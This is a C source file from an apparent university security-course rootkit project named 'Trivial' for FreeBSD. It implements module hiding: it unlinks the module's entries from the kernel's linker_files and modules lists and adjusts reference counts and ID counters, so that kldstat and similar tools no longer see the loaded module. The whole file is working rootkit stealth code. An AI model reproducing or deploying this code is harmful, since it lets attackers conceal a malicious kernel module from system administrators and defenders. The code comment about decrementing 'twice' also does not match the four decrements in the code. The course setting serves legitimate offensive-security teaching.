/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 * Functions and data structures for hiding
 * 	the loadable kernel module from tools such as kldstat 
 *
 */

#include "trivial.h"

/*
 * The following is the list of variables you need to reference in order
 * to hide this module, which aren't defined in any header files.
 */
extern linker_file_list_t linker_files;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
	TAILQ_ENTRY(module)	link;    /* chain together all modules */
	TAILQ_ENTRY(module)	flink;   /* all modules in a file */
	struct linker_file	*file;   /* file which contains this module */
	int			refs;    /* reference count */
	int			id;      /* unique id number */
	char			*name;   /* module name */
	modeventhand_t		handler; /* event handler */
	void			*arg;    /* argument for handler */
	modspecific_t		data;    /* module specific data */
};

void 
unload_kld_list (void)
{
	struct linker_file *lf;
	struct module *mod;

	mtx_lock(&Giant);

	/* Decrement the current kernel image's reference count twice for each module */
	(&linker_files)->tqh_first->refs--;
	(&linker_files)->tqh_first->refs--;
	(&linker_files)->tqh_first->refs--;
	(&linker_files)->tqh_first->refs--;

	/*
	 * Iterate through the linker_files list, looking for F_NAME.
	 * If found, decrement next_file_id and remove from list.
	 */
	TAILQ_FOREACH(lf, &linker_files, link) {
		if (strcmp(lf->filename, F_NAME) == 0 ||
			strcmp(lf->filename, F_NAME2) == 0) {
			next_file_id--;
			TAILQ_REMOVE(&linker_files, lf, link);
		}
	}

	mtx_unlock(&Giant);

	sx_xlock(&modules_sx);

	/*
	 * Iterate through the modules list, looking for NAME.
	 * If found, decrement nextid and remove from list.
	 */
	TAILQ_FOREACH(mod, &modules, link) {
		if (strcmp(mod->name, NAME) == 0) {
			nextid--;
			TAILQ_REMOVE(&modules, mod, link);
			break;
		}
	}

	sx_xunlock(&modules_sx);
}
